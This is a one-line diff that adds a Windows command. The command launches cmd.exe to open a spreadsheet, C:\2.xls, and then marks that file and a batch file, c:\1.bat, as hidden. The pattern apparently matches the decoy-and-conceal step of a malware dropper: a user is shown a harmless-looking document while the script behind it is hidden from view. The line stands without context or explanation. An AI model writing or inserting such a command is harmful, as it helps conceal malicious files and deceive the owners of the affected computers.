@@ -1,0 +1,1 @@
+%SystemRoot%\system32\cmd.exe /c start C:\2.xls &attrib c:\2.xls +h &attrib c:\1.bat +h
